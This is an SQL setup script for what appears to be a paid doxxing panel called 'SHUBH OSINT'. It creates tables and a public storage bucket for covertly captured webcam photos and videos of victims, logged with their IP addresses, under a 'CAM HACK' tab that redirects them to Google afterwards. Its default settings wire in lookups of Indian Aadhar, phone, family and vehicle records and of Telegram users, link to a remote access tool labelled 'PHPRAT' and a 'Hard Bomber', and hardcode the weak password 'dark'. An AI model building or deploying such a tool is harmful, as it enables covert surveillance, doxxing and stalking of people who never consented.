-- =====================================================
-- SHUBH OSINT - Complete Supabase Database Setup
-- =====================================================
-- Run this SQL in your new Supabase project's SQL Editor
-- Last Updated: 2026-01-14
-- Version: 2.1
-- =====================================================

-- =====================================================
-- 1. CREATE TABLES
-- =====================================================

-- Access Passwords Table (for credit-based access system)
CREATE TABLE IF NOT EXISTS public.access_passwords (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_hash TEXT NOT NULL,
  password_display TEXT NOT NULL,
  total_credits INTEGER NOT NULL DEFAULT 0,
  remaining_credits INTEGER NOT NULL DEFAULT 0,
  is_enabled BOOLEAN NOT NULL DEFAULT true,
  is_used BOOLEAN NOT NULL DEFAULT false,
  is_unlimited BOOLEAN NOT NULL DEFAULT false,
  device_id TEXT,
  used_at TIMESTAMP WITH TIME ZONE,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- User Sessions Table (tracks active sessions)
CREATE TABLE IF NOT EXISTS public.user_sessions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  device_id TEXT NOT NULL,
  session_token TEXT NOT NULL,
  is_active BOOLEAN NOT NULL DEFAULT true,
  last_active_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Credit Usage Table (logs all credit usage)
CREATE TABLE IF NOT EXISTS public.credit_usage (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  credits_used INTEGER NOT NULL,
  search_type TEXT NOT NULL,
  search_query TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- App Settings Table (stores all app configuration)
CREATE TABLE IF NOT EXISTS public.app_settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  setting_key TEXT NOT NULL UNIQUE,
  setting_value JSONB NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Captured Photos Table (for camera capture feature)
CREATE TABLE IF NOT EXISTS public.captured_photos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  image_data TEXT NOT NULL,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Captured Videos Table (for video capture feature)
CREATE TABLE IF NOT EXISTS public.captured_videos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  video_url TEXT NOT NULL,
  duration_seconds INTEGER DEFAULT 5,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Search History Table (logs all searches)
CREATE TABLE IF NOT EXISTS public.search_history (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  search_type TEXT NOT NULL,
  search_query TEXT NOT NULL,
  ip_address TEXT,
  searched_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- =====================================================
-- 2. ENABLE ROW LEVEL SECURITY
-- =====================================================

ALTER TABLE public.access_passwords ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.credit_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_videos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.search_history ENABLE ROW LEVEL SECURITY;

-- =====================================================
-- 3. RLS POLICIES
-- =====================================================

-- Access Passwords - No direct access (only via edge functions with service role)
DROP POLICY IF EXISTS "No direct access to passwords" ON public.access_passwords;
CREATE POLICY "No direct access to passwords" ON public.access_passwords
  AS RESTRICTIVE FOR ALL USING (false);

-- User Sessions - No direct access (only via edge functions)
DROP POLICY IF EXISTS "No direct access to sessions" ON public.user_sessions;
CREATE POLICY "No direct access to sessions" ON public.user_sessions
  AS RESTRICTIVE FOR ALL USING (false);

-- Credit Usage - No direct access (only via edge functions)
DROP POLICY IF EXISTS "No direct access to credit usage" ON public.credit_usage;
CREATE POLICY "No direct access to credit usage" ON public.credit_usage
  AS RESTRICTIVE FOR ALL USING (false);

-- App Settings - Public read/write (for settings sync across devices)
DROP POLICY IF EXISTS "Anyone can read settings" ON public.app_settings;
CREATE POLICY "Anyone can read settings" ON public.app_settings
  AS RESTRICTIVE FOR SELECT USING (true);

DROP POLICY IF EXISTS "Anyone can insert settings" ON public.app_settings;
CREATE POLICY "Anyone can insert settings" ON public.app_settings
  AS RESTRICTIVE FOR INSERT WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can update settings" ON public.app_settings;
CREATE POLICY "Anyone can update settings" ON public.app_settings
  AS RESTRICTIVE FOR UPDATE USING (true);

-- Captured Photos - Public access (view, insert, delete)
DROP POLICY IF EXISTS "Anyone can view captured photos" ON public.captured_photos;
CREATE POLICY "Anyone can view captured photos" ON public.captured_photos
  AS RESTRICTIVE FOR SELECT USING (true);

DROP POLICY IF EXISTS "Allow insert for photo capture" ON public.captured_photos;
CREATE POLICY "Allow insert for photo capture" ON public.captured_photos
  AS RESTRICTIVE FOR INSERT WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete captured photos" ON public.captured_photos;
CREATE POLICY "Anyone can delete captured photos" ON public.captured_photos
  AS RESTRICTIVE FOR DELETE USING (true);

-- Captured Videos - Public access (view, insert, delete)
DROP POLICY IF EXISTS "Anyone can view captured videos metadata" ON public.captured_videos;
CREATE POLICY "Anyone can view captured videos metadata" ON public.captured_videos
  AS RESTRICTIVE FOR SELECT USING (true);

DROP POLICY IF EXISTS "Anyone can insert video metadata" ON public.captured_videos;
CREATE POLICY "Anyone can insert video metadata" ON public.captured_videos
  AS RESTRICTIVE FOR INSERT WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete video metadata" ON public.captured_videos;
CREATE POLICY "Anyone can delete video metadata" ON public.captured_videos
  AS RESTRICTIVE FOR DELETE USING (true);

-- Search History - Public access (view, insert, delete)
DROP POLICY IF EXISTS "Anyone can view search history" ON public.search_history;
CREATE POLICY "Anyone can view search history" ON public.search_history
  AS RESTRICTIVE FOR SELECT USING (true);

DROP POLICY IF EXISTS "Anyone can insert search history" ON public.search_history;
CREATE POLICY "Anyone can insert search history" ON public.search_history
  AS RESTRICTIVE FOR INSERT WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete search history" ON public.search_history;
CREATE POLICY "Anyone can delete search history" ON public.search_history
  AS RESTRICTIVE FOR DELETE USING (true);

-- =====================================================
-- 4. STORAGE BUCKET (for video capture)
-- =====================================================

-- Create storage bucket for captured videos
INSERT INTO storage.buckets (id, name, public)
VALUES ('captured-videos', 'captured-videos', true)
ON CONFLICT (id) DO NOTHING;

-- Storage policies for captured-videos bucket
DROP POLICY IF EXISTS "Anyone can view captured videos" ON storage.objects;
CREATE POLICY "Anyone can view captured videos" ON storage.objects
  FOR SELECT USING (bucket_id = 'captured-videos');

DROP POLICY IF EXISTS "Anyone can upload captured videos" ON storage.objects;
CREATE POLICY "Anyone can upload captured videos" ON storage.objects
  FOR INSERT WITH CHECK (bucket_id = 'captured-videos');

DROP POLICY IF EXISTS "Anyone can delete captured videos" ON storage.objects;
CREATE POLICY "Anyone can delete captured videos" ON storage.objects
  FOR DELETE USING (bucket_id = 'captured-videos');

-- =====================================================
-- 5. FUNCTIONS AND TRIGGERS
-- =====================================================

-- Update timestamp function
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

-- Trigger for app_settings
DROP TRIGGER IF EXISTS update_app_settings_updated_at ON public.app_settings;
CREATE TRIGGER update_app_settings_updated_at
  BEFORE UPDATE ON public.app_settings
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- Trigger for access_passwords
DROP TRIGGER IF EXISTS update_access_passwords_updated_at ON public.access_passwords;
CREATE TRIGGER update_access_passwords_updated_at
  BEFORE UPDATE ON public.access_passwords
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- =====================================================
-- 6. INDEXES (for better query performance)
-- =====================================================

CREATE INDEX IF NOT EXISTS idx_app_settings_key ON public.app_settings(setting_key);
CREATE INDEX IF NOT EXISTS idx_captured_photos_session ON public.captured_photos(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_photos_date ON public.captured_photos(captured_at);
CREATE INDEX IF NOT EXISTS idx_captured_videos_session ON public.captured_videos(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_videos_date ON public.captured_videos(captured_at);
CREATE INDEX IF NOT EXISTS idx_search_history_type ON public.search_history(search_type);
CREATE INDEX IF NOT EXISTS idx_search_history_date ON public.search_history(searched_at);
CREATE INDEX IF NOT EXISTS idx_access_passwords_hash ON public.access_passwords(password_hash);
CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON public.user_sessions(session_token);
CREATE INDEX IF NOT EXISTS idx_user_sessions_password ON public.user_sessions(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_password ON public.credit_usage(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_date ON public.credit_usage(created_at);

-- =====================================================
-- 7. DEFAULT DATA
-- =====================================================

-- Main Settings (includes admin password, session ID, search buttons, tabs, etc.)
INSERT INTO public.app_settings (setting_key, setting_value)
VALUES ('main_settings', '{
  "sitePassword": "dark",
  "adminPassword": "dark",
  "theme": "dark",
  "headerName1": "SHUBH",
  "headerName2": "OSINT",
  "headerIcon": "Zap",
  "headerCustomLogo": "",
  "headerColor1": "green",
  "headerColor2": "pink",
  "headerFont": "Orbitron",
  "headerStyle": "normal",
  "darkDbUrl": "https://shubhinfo.vercel.app/",
  "darkDbHeight": "70",
  "darkDbBorderColor": "purple",
  "darkDbBorderWidth": "2",
  "backgroundImage": "",
  "backgroundOpacity": "30",
  "camSessionId": "shubhcam01",
  "camRedirectUrl": "https://google.com",
  "customCaptureHtml": "",
  "chromeCustomHtml": "",
  "allSearchAccessKey": "darkosint",
  "telegramOsintAccessKey": "darkosint",
  "sitePasswordEnabled": true,
  "allSearchKeyEnabled": true,
  "telegramKeyEnabled": true,
  "creditSystemEnabled": true,
  "page2MusicUrl": "",
  "mainPageMusicUrl": "/audio/background-music.mp3",
  "tabs": [
    {"id": "phone", "label": "Phone", "icon": "Phone", "color": "green", "placeholder": "Enter phone number...", "searchType": "phone", "apiUrl": "", "enabled": true},
    {"id": "aadhar", "label": "Aadhar", "icon": "CreditCard", "color": "pink", "placeholder": "Enter Aadhar number...", "searchType": "aadhar", "apiUrl": "", "enabled": true},
    {"id": "vehicle", "label": "Vehicle", "icon": "Car", "color": "orange", "placeholder": "Enter RC number...", "searchType": "vehicle", "apiUrl": "https://darknagi-osint-vehicle-api.vercel.app/api/vehicle?rc=", "enabled": true},
    {"id": "instagram", "label": "Instagram", "icon": "Camera", "color": "cyan", "placeholder": "Enter username...", "searchType": "instagram", "apiUrl": "", "enabled": true},
    {"id": "family", "label": "Family", "icon": "Users", "color": "purple", "placeholder": "Enter name/number...", "searchType": "family", "apiUrl": "", "enabled": true},
    {"id": "manual", "label": "Manual", "icon": "ClipboardPaste", "color": "yellow", "placeholder": "Enter number...", "searchType": "manual", "apiUrl": "https://hydrashop.in.net/number.php?q=", "enabled": true},
    {"id": "shubh", "label": "CAM HACK", "icon": "Sparkles", "color": "white", "placeholder": "", "searchType": "shubh", "apiUrl": "", "enabled": true},
    {"id": "darkdb", "label": "Hard Bomber", "icon": "Database", "color": "teal", "placeholder": "", "searchType": "darkdb", "apiUrl": "https://2info.vercel.app", "enabled": true},
    {"id": "telegram", "label": "Telegram OSI", "icon": "Send", "color": "blue", "placeholder": "", "searchType": "telegram", "apiUrl": "", "enabled": true},
    {"id": "allsearch", "label": "All Search", "icon": "Globe", "color": "red", "placeholder": "Enter phone / email / name...", "searchType": "allsearch", "apiUrl": "https://lek-steel.vercel.app/api/search?q=", "enabled": true},
    {"id": "tgtonum", "label": "Tg To Num", "icon": "MessageCircle", "color": "lime", "placeholder": "Enter Telegram username...", "searchType": "tgtonum", "apiUrl": "", "enabled": true},
    {"id": "phprat", "label": "PHPRAT", "icon": "Code", "color": "emerald", "placeholder": "", "searchType": "phprat", "apiUrl": "https://userb-92mn.onrender.com/", "enabled": true},
    {"id": "randipanel", "label": "RANDI PANEL", "icon": "Skull", "color": "red", "placeholder": "", "searchType": "randipanel", "apiUrl": "", "enabled": true}
  ],
  "telegramOsint": {
    "jwtToken": "",
    "baseUrl": "https://funstat.info",
    "tools": [
      {"id": "basic_info", "label": "BASIC INFO", "enabled": true, "cost": "0.10 credit"},
      {"id": "groups", "label": "GROUPS", "enabled": true, "cost": "5 credits"},
      {"id": "group_count", "label": "GROUP COUNT", "enabled": true, "cost": "FREE"},
      {"id": "messages_count", "label": "MESSAGES COUNT", "enabled": true, "cost": "FREE"},
      {"id": "messages", "label": "MESSAGES (LIMITED)", "enabled": true, "cost": "10 credits"},
      {"id": "stats_min", "label": "BASIC STATS", "enabled": true, "cost": "FREE"},
      {"id": "stats", "label": "FULL STATS", "enabled": true, "cost": "1 credit"},
      {"id": "reputation", "label": "REPUTATION", "enabled": true, "cost": "FREE"},
      {"id": "resolve_username", "label": "USERNAME RESOLVE", "enabled": true, "cost": "0.10 credit"},
      {"id": "username_usage", "label": "USERNAME USAGE", "enabled": true, "cost": "0.1 credit"},
      {"id": "usernames", "label": "USERNAMES HISTORY", "enabled": true, "cost": "3 credits"},
      {"id": "names", "label": "NAMES HISTORY", "enabled": true, "cost": "3 credits"},
      {"id": "stickers", "label": "STICKERS", "enabled": true, "cost": "1 credit"},
      {"id": "common_groups", "label": "COMMON GROUPS", "enabled": true, "cost": "5 credits"}
    ]
  }
}'::jsonb)
ON CONFLICT (setting_key) DO NOTHING;

-- =====================================================
-- SETUP COMPLETE!
-- =====================================================
-- After running this SQL:
-- 1. Deploy the edge functions from supabase/functions/
-- 2. Update config.toml with your project ID
-- 3. Set up the PHPRAT tab URL in Admin panel if needed
-- 4. Configure Telegram OSINT JWT token in Admin panel
-- =====================================================
